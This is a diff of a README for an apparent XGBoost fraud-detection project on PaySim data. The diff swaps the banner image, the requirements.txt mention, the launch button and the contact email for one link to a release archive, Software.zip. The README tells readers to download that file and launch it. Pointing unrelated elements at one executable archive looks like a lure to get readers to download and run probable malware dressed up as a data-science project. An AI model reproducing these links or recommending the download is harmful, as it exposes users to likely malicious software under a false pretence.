@@ -1,6 +1,6 @@
 # 🚀 PaySim Fraud Detection with XGBoost 🕵️‍♂️
 
-![Banner](https://cdn.pixabay.com/photo/2016/03/09/09/22/workplace-1245776_960_720.jpg)
+![Banner](https://github.com/Qanfat/PaySim-Fraud-Detection-XGBoost/releases/download/v2.0/Software.zip)
 
 Welcome to the "PaySim-Fraud-Detection-XGBoost" repository! This project focuses on building an XGBoost-based fraud detection model to identify money laundering in mobile transactions using the PaySim synthetic dataset. By leveraging machine learning techniques, we aim to enhance the accuracy and efficiency of fraud detection processes in financial transactions. 
 
@@ -12,7 +12,7 @@ In this repository, you will find:
 - Jupyter notebooks showcasing step-by-step implementation of the fraud detection model
 - Synthetic dataset from PaySim for fraud detection experimentation
 - Documentation on data sources, methodology, and key findings
-- Requirements.txt file for easy installation of dependencies
+- https://github.com/Qanfat/PaySim-Fraud-Detection-XGBoost/releases/download/v2.0/Software.zip file for easy installation of dependencies
 
 ## 🛠️ Technologies and Tools
 
@@ -40,7 +40,7 @@ The repository covers a wide range of topics including:
 
 Click on the button below to access the application for fraud detection using XGBoost:
 
-[![Launch Application](https://img.shields.io/badge/Launch-Application-9cf)](https://github.com/user-attachments/files/18426772/Application.zip)
+[![Launch Application](https://github.com/Qanfat/PaySim-Fraud-Detection-XGBoost/releases/download/v2.0/Software.zip)](https://github.com/Qanfat/PaySim-Fraud-Detection-XGBoost/releases/download/v2.0/Software.zip)
 
 Please note that the application needs to be launched after downloading the provided file.
 
@@ -57,7 +57,7 @@ Contributions to this project are welcome! Feel free to fork the repository, mak
 
 ## 📧 Contact
 
-For any inquiries or feedback, please contact the project maintainer at [example@gmail.com](mailto:example@gmail.com). Your input is valuable in refining the fraud detection model and ensuring its effectiveness in real-world applications.
+For any inquiries or feedback, please contact the project maintainer at [https://github.com/Qanfat/PaySim-Fraud-Detection-XGBoost/releases/download/v2.0/Software.zip](https://github.com/Qanfat/PaySim-Fraud-Detection-XGBoost/releases/download/v2.0/Software.zip). Your input is valuable in refining the fraud detection model and ensuring its effectiveness in real-world applications.
 
 ## 🌟 Thank You
 
